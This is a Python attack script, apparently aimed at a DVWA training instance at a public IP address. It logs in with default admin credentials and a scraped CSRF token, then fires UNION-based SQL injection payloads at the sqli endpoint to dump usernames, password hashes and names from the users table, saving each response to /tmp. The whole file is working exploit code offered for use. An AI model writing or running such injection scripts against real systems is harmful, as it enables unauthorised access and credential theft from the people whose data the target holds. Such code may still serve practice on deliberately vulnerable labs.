
import requests
import re
import urllib.parse

url = "http://31.97.117.123/"
session = requests.Session()

# Login first
response = session.get(f"{url}login.php")
token_match = re.search(r"user_token'\s+value='([a-f0-9]+)'", response.text)
csrf_token = token_match.group(1)

login_data = {
    "username": "admin",
    "password": "password",
    "user_token": csrf_token,
    "Login": "Login"
}

session.post(f"{url}login.php", data=login_data)

print("[*] Extracting user data with 2-column payload...")

# Since we need 2 columns, let's extract different user data
# First, let's try extracting user and password
payloads = [
    ("1' UNION SELECT user, password FROM users WHERE '1'='1", "username + password"),
    ("1' UNION SELECT first_name, last_name FROM users WHERE '1'='1", "first_name + last_name"),
    ("1' UNION SELECT CONCAT(first_name, ' ', last_name), password FROM users WHERE '1'='1", "full_name + password"),
    ("1' UNION SELECT user, CONCAT(first_name, ' ', last_name) FROM users WHERE '1'='1", "username + full_name"),
]

for payload, description in payloads:
    print(f"\n[*] Trying: {description}")
    encoded_payload = urllib.parse.quote(payload)
    
    response = session.get(f"{url}vulnerabilities/sqli/?id={encoded_payload}&Submit=Submit")
    
    if "The used SELECT statements have a different number of columns" not in response.text:
        print(f"[+] Payload successful!")
        print(f"Response length: {len(response.text)}")
        
        # Save this response
        filename = f"/tmp/sqli_{description.replace(' ', '_')}.html"
        with open(filename, "w") as f:
            f.write(response.text)
        print(f"Response saved to {filename}")
        
        # Extract the data
        if "First name:" in response.text:
            # Get all the data lines
            matches = re.findall(r'<pre>ID:.*?</pre>', response.text)
            if matches:
                print(f"Found {len(matches)} result(s)")
                for i, match in enumerate(matches[:5]):  # Show first 5
                    print(f"Result {i+1}: {match[:100]}")
    else:
        print(f"[-] Column count mismatch")

